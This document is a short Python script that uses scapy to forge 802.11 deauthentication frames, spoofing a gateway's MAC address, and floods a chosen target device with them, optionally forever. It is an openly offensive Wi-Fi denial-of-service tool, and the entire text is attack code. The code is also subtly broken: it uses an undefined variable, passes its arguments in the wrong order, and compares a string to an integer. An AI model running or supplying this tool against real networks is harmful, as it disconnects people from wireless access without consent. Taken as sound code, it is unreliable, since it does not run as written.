import argparse
import colorama
from scapy.all import *
from colorama import Fore, Back, Style

colorama.init(autoreset=True)

def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface=""):
	dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
	if count:
		print(f"[+] Sending {count} frames every {interval}s...")

	elif loop:
		print(f"[+] Sending frames every {interval}s for ever...")

	sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=1)

argument_parser = argparse.ArgumentParser(description='')
argument_parser.add_argument('target', help='Target MAC')
argument_parser.add_argument('gateway', help='Target Gateway')
argument_parser.add_argument('-c', help='Count')
argument_parser.add_argument('-t', help='Interval')
argument_parser.add_argument('-i', help='Interface')
args = argument_parser.parse_args()

if args.c == 0:
	loop = 1
	count = None
else:
	loop = 0

deauth(args.target, args.gateway, args.c, loop, args.t, args.i)
